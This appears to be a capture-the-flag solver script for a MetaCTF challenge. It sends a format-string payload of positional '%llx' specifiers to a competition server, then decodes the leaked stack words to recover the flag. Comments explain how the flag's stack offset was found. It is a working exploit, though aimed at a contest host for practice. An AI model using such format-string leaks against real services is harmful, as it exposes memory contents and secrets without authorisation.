#!/usr/bin/env python3

import socket
import struct
import binascii

if __name__ == "__main__":
    HOST = "host1.metaproblems.com"
    HOST = socket.gethostbyname(HOST)
    PORT = 5470
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))

        print(s.recv(1024))

        # percent_x = b" %llx" * 16

        '''
        leak the stack as much as we can until we encounter this hex value
        7b4654436174654d
        which is the little-endiann format for "MetaCTF{"
        Next, count the position. In this case, it is printed out by 8th %llx
        Thus, we can leak the flag by sending this payload
        "%8$llx %9$llx %10$llx ..."
        '''

        payload = ''

        for i in range(8, 20):
            fmt = f"%{i}$llx "
            payload += fmt

        s.send(payload.encode())

        data = s.recv(1024)
        data += s.recv(1024)


    data = data.split()[4:]

    for i in data:
        i = i.zfill(16)
        print(binascii.unhexlify(i)[::-1].decode(),end='')
